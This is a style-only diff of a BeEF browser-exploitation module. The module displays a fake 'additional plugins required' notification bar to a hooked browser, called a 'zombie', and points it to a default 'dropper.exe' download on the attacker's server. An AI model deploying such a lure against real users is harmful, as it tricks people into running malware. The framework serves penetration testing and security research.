@@ -4,7 +4,6 @@
 # See the file 'doc/COPYING' for copying permission
 #
 class Fake_notification_c < BeEF::Core::Command
-
   def self.options
     @configuration = BeEF::Core::Configuration.instance
     proto = @configuration.beef_proto
@@ -12,16 +11,15 @@ class Fake_notification_c < BeEF::Core::Command
     beef_port = @configuration.beef_port
     base_host = "#{proto}://#{beef_host}:#{beef_port}"
 
-    return [
-      {'name' => 'url', 'ui_label' => 'URL', 'value' => "#{base_host}/dropper.exe", 'width'=>'150px'},
+    [
+      { 'name' => 'url', 'ui_label' => 'URL', 'value' => "#{base_host}/dropper.exe", 'width' => '150px' },
       { 'name' => 'notification_text',
         'description' => 'Text displayed in the notification bar',
         'ui_label' => 'Notification text',
-        'value' => "Additional plugins are required to display all the media on this page."
-      }
+        'value' => 'Additional plugins are required to display all the media on this page.' }
     ]
   end
-  
+
   #
   # This method is being called when a zombie sends some
   # data back to the framework.
@@ -31,5 +29,4 @@ class Fake_notification_c < BeEF::Core::Command
     content['result'] = @datastore['result']
     save content
   end
-  
 end
